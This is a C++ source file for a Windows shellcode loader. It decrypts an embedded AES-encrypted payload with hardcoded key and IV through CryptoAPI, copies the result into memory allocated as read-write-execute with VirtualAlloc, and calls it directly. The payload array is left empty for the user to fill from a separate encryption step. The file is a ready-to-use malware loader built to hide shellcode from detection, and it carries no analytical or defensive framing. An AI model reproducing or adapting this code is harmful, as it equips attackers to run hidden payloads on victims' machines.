// main.cpp
#include <windows.h>
#include <iostream>
#include <vector>
#include <wincrypt.h>

#pragma comment(lib, "advapi32.lib")

//  Fill in from Python output
const BYTE key[16] = {
    0xee, 0x88, 0xc9, 0xa8, 0x97, 0x75, 0xdb, 0x27, 0xc4,
    0x0f, 0xe8, 0xff, 0x42, 0x6c, 0x48, 0x0c
};
const BYTE iv[16]  = {
   0x3c, 0x68, 0xcf, 0xf4, 0xcd, 0x04, 0x70, 0x66, 0x29,
   0x41, 0xd6, 0x5d, 0xaa, 0x9d, 0xe9, 0x61
};

//  Encrypted shellcode
unsigned char encrypted_payload[] = {
    // Fill this with contents of payload.bin
};

DWORD payload_len = sizeof(encrypted_payload);

// Decrypt function using Windows CryptoAPI
bool decryptAES(const BYTE* encrypted, DWORD len, const BYTE* key, const BYTE* iv, std::vector<BYTE>& decrypted_out) {
    HCRYPTPROV hProv = 0;
    HCRYPTHASH hHash = 0;
    HCRYPTKEY hKey = 0;

    if (!CryptAcquireContext(&hProv, NULL, NULL, PROV_RSA_AES, CRYPT_VERIFYCONTEXT)) {
        return false;
    }

    if (!CryptCreateHash(hProv, CALG_SHA_256, 0, 0, &hHash)) return false;
    if (!CryptHashData(hHash, key, 16, 0)) return false;

    if (!CryptDeriveKey(hProv, CALG_AES_128, hHash, 0, &hKey)) return false;

    DWORD decrypted_len = len;
    decrypted_out.resize(len);
    memcpy(decrypted_out.data(), encrypted, len);

    // Set IV
    CRYPT_DATA_BLOB ivBlob = { 16, (BYTE*)iv };
    CryptSetKeyParam(hKey, KP_IV, (BYTE*)&ivBlob, 0);

    if (!CryptDecrypt(hKey, 0, TRUE, 0, decrypted_out.data(), &decrypted_len)) return false;

    decrypted_out.resize(decrypted_len);

    CryptDestroyKey(hKey);
    CryptDestroyHash(hHash);
    CryptReleaseContext(hProv, 0);

    return true;
}

int main() {
    std::vector<BYTE> shellcode;

    if (!decryptAES(encrypted_payload, payload_len, key, iv, shellcode)) {
        std::cerr << "[!] Decryption failed.\n";
        return 1;
    }

    // Allocate memory with RWX
    void* exec = VirtualAlloc(0, shellcode.size(), MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    if (!exec) {
        std::cerr << "[!] VirtualAlloc failed.\n";
        return 1;
    }

    memcpy(exec, shellcode.data(), shellcode.size());

    // Call the shellcode
    ((void(*)())exec)();

    return 0;
}
